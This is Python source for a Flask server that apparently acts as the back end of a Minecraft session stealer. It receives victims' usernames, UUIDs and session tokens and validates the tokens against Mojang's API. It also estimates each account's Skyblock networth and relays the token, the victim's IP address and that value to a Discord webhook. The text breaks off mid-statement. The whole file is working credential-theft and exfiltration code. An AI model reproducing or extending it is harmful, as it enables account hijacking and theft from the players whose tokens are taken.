import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests
import numerize

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)


def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Bearer " + ssid
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        if r.json()['name'] == ign and r.json()['id'] == uuid:
            return True
        else:
            return False
    else:
        return False

def getnetworth(ign: str):
    try:
        url = config['networth_api'] + "/v2/profiles/" + ign + "?key=YOUR_SKYHELPER_API_KEY_HERE"
        response = requests.get(url)
        kekw = response.json()
        networth = 0
        for profile in kekw['data']:
            networth += profile['networth']['unsoulboundNetworth']
        return networth
    except:
        return 0

class SSID(Resource):
    def post(self):
        args = request.json
        print(args)

        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            ip = request.environ['REMOTE_ADDR']
        else:
            ip = request.environ['HTTP_X_FORWARDED_FOR']

        if ip in ips:
            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 60:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = time.time()
            else:
                if ips[ip]['count'] < config['ip_ratelimit']:
                    ips[ip]['count'] += 1
                else:
                    print("Rejected ratelimited ip")
                    return {'status': 'ratelimited'}, 429

        else:
            ips[ip] = {
                'count': 1,
                'timestamp': time.time()
            }

        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
                                 username=config['webhook_name'],
                                 avatar_url=config['webhook_avatar'])

        if config['codeblock_type'] == 'small':
            cb = '`'
        elif config['codeblock_type'] == 'big':
            cb = '```'
        else:
            cb = '`'
            print('Invalid codeblock type in config.json, defaulting to small')

        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session']:
            if not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
                print("Rejected invalid session id")
                return {'status': 'invalid session'}, 401

        mc_embed = DiscordEmbed(title=config['mc_embed_title'],
                                 color=hex(int(config['mc_embed_color'], 16)))
        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
        mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
        try:
            mc_embed.add_embed_field(name='Networth', value="`" + numerize.numerize(getnetworth(mc['ign'])) + "`", inline=True)
        except
